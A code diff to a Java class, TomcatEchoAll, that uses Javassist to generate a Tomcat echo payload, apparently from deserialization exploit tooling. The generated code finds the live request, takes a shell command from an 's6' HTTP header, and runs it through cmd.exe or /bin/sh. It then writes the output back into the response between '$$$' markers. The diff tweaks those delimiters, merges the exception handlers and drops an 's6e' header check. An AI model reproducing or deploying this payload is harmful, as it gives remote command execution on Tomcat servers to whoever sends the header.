@@ -21,23 +21,16 @@ public class TomcatEchoAll {
                 "        clazz = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
                 "        o = clazz.newInstance();\n" +
                 "        clazz.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
-                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\"});\n" +
+                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\\n\"});\n" +
                 "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
-                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\"});\n" +
-
-                "    } catch (ClassNotFoundException e) {\n" +
+                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\n\"});\n" +
+                "    } catch (Exception e) {\n" +
                 "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
                 "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
-                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\"});\n" +
+                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\\n\"});\n" +
                 "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
-                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\"});\n" +
-                "    } catch (NoSuchMethodException e) {\n" +
-                "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
-                "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
-                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\"});\n" +
-                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
-                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\"});\n" +
-                "    }\n" +
+                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\\n\"});\n" +
+                "    } \n" +
                 "}", ctClass));
 
         ctClass.addMethod(CtMethod.make("private static Object getFV(Object o, String s) throws Exception {\n" +
@@ -87,11 +80,6 @@ public class TomcatEchoAll {
                 "                Object p = ps.get(j);\n" +
                 "                o = getFV(p, \"req\");\n" +
                 "                resp = o.getClass().getMethod(\"getResponse\", new Class[0]).invoke(o, new Object[0]);\n" +
-                "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"s6e\"});\n" +
-                "                if (s != null && !s.isEmpty()) {\n" +
-                "                    resp.getClass().getMethod(\"addHeader\", new Class[]{String.class, String.class}).invoke(resp, new Object[]{\"s6e\", s});\n" +
-                "                    done = true;\n" +
-                "                }\n" +
                 "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"s6\"});\n" +
                 "                if (s != null && !s.isEmpty()) {\n" +
                 "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", s} : new String[]{\"/bin/sh\", \"-c\", s};\n" +
